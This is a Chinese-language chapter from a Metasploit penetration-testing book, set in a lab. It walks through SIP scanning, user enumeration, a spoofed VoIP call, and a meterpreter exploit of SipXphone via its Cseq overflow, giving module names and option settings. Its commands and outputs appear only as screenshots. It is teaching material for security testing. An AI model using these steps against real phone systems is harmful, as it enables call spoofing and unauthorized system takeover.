我们可以使用 Metasploit 内置的 SIP 扫描器模块对网络上的 VoIP 设备进行指纹识别。一个常见的 SIP 扫描器是内置在 Metasploit 中的**SIP 终端扫描器**。我们可以使用这个扫描器通过向各种 SIP 服务发出选项请求来识别网络上启用 SIP 的设备。

让我们继续使用辅助模块下的选项来扫描 VoIP 服务

`/auxiliary/scanner/sip`并分析结果。目标是运行 Asterisk PBX VoIP 客户端的 Windows XP 系统。我们首先加载用于扫描网络上的 SIP 服务的辅助模块，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00061.jpeg)

我们可以看到，我们有很多选项可以与`auxiliary/scanner/sip/options`辅助模块一起使用。我们只需要配置`RHOSTS`选项。然而，对于庞大的网络，我们可以使用**无类域间路由**（**CIDR**）标识符定义 IP 范围。运行后，该模块将开始扫描可能正在使用 SIP 服务的 IP。让我们按照以下方式运行此模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00239.jpeg)

正如我们可以清楚地看到的那样，当此模块运行时，它返回了许多与使用 SIP 服务的 IP 相关的信息。这些信息包含了代理，表示 PBX 的名称和版本，以及动词，定义了 PBX 支持的请求类型。因此，我们可以使用此模块来收集关于网络上 SIP 服务的大量知识。

# 扫描 VoIP 服务

在找到目标支持的各种选项请求的信息后，让我们现在使用另一个 Metasploit 模块`auxiliary/scanner/sip/enumerator`来扫描和枚举 VoIP 服务的用户。这个模块将在目标范围内搜索 VoIP 服务，并尝试枚举其用户。让我们看看我们如何实现这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00032.jpeg)

现在我们已经列出了可以与此模块一起使用的选项。我们现在将设置一些以下选项以成功运行此模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00271.jpeg)

正如我们所看到的，我们已经设置了`MAXEXT`，`MINEXT`，`PADLEN`和`RHOSTS`选项。

在前面截图中使用的 enumerator 模块中，我们将`MINEXT`和`MAXEXT`分别定义为`3000`和`3005`。`MINEXT`是开始搜索的分机号，`MAXEXT`是完成搜索的最后一个分机号。这些选项可以设置为巨大的范围，比如`MINEXT`设置为`0`，`MAXEXT`设置为`9999`，以找出在分机号`0`到`9999`上使用 VoIP 服务的各种用户。

让我们将此模块在目标范围上运行，将`RHOSTS`变量设置为 CIDR 值，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00021.jpeg)

将`RHOSTS`设置为`192.168.65.0/24`将扫描整个子网。现在，让我们运行此模块，看看它呈现了什么输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00069.jpeg)

这次搜索返回了许多使用 SIP 服务的用户。此外，`MAXEXT`和`MINEXT`的影响是只扫描了从`3000`到`3005`的分机用户。分机可以被视为特定网络中用户的标准地址。

# 伪造 VoIP 呼叫

在获得关于使用 SIP 服务的各种用户的足够知识后，让我们尝试使用 Metasploit 向用户发起一个虚假呼叫。假设目标用户在 Windows XP 平台上运行 SipXphone 2.0.6.27，让我们使用`auxiliary/VoIP/sip_invite_spoof`模块发送一个虚假的邀请请求给用户，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00077.jpeg)

我们将使用目标的 IP 地址设置 RHOSTS 选项，并将 EXTENSION 设置为目标的 4444。让我们将 SRCADDR 保持为 192.168.1.1，这将伪装呼叫的源地址。

让我们现在按照以下方式`run`该模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00131.jpeg)

让我们看看受害者那边发生了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00160.jpeg)

我们可以清楚地看到软电话正在响铃，并显示呼叫者为 192.168.1.1，并且还显示了来自 Metasploit 的预定义消息。

# 利用 VoIP

为了完全访问系统，我们也可以尝试利用软电话软件。我们已经从之前的情景中得到了目标的 IP 地址。让我们用 Metasploit 来扫描和利用它。然而，在 Kali 操作系统中有专门设计用于测试 VoIP 服务的专用 VoIP 扫描工具。以下是我们可以用来利用 VoIP 服务的应用程序列表：

+   Smap

+   Sipscan

+   Sipsak

+   VoiPong

+   Svmap

回到这个练习的利用部分，我们在 Metasploit 中有一些可以用于软电话的利用。让我们看一个例子。

我们要利用的应用程序是 SipXphone 版本 2.0.6.27。该应用程序的界面可能类似于以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00179.jpeg)

# 关于漏洞

漏洞存在于应用程序对 Cseq 值的处理中。发送一个过长的字符串会导致应用程序崩溃，并且在大多数情况下，它将允许攻击者运行恶意代码并访问系统。

# 利用应用程序

现在让我们利用 Metasploit 来 exploit SipXphone 版本 2.0.6.27 应用程序。我们要使用的 exploit 是`exploit/windows/sip/sipxphone_cseq`。让我们将这个模块加载到 Metasploit 中，并设置所需的选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00208.jpeg)

我们需要设置`RHOST`、`LHOST`和`payload`的值。现在一切都设置好了，让我们像下面这样`exploit`目标应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00242.jpeg)

哇！我们很快就得到了 meterpreter。因此，利用 Metasploit 进行 VoIP 的 exploit 在软件漏洞的情况下可能很容易。然而，在测试 VoIP 设备和其他与服务相关的漏洞时，我们可以使用第三方工具进行充分的测试。

测试 VoIP 的一个很好的资源可以在[`www.viproy.com`](http://www.viproy.com)找到。

# 总结和练习

在本章中，我们看到了如何测试 MySQL 数据库、VoIP 服务和 SCADA 系统的多个漏洞。我们看到了攻击者只要获得数据库访问权限就可能最终获得系统级别的访问权限。我们还看到了 ICS 和 SCADA 中的漏洞如何导致攻击者 compromise 整个服务器，这可能导致巨大的损害，我们还看到了部署在各个公司的 PBX 不仅可以用于欺骗电话，还可以 compromise 整个客户端系统。为了练习你的技能，你可以按照自己的节奏进行以下进一步的练习：

+   尝试测试 MSSQL 和 PostgreSQL 数据库，并记下模块。

+   下载其他基于软件的 SCADA 系统，并尝试在本地 exploit 它们。

+   尝试为 MSSQL 运行系统命令。

+   解决 MySQL 写入服务器时的错误 13。

+   本章涵盖的数据库测试是在 Metasploitable 2 上执行的。尝试在本地设置相同的环境并重复练习。

在过去的五章中，我们涵盖了各种模块、exploits 和服务，这花费了大量的时间。让我们看看如何在第六章中使用 Metasploit 加速测试过程，*Fast-Paced Exploitation with Metasploit*。
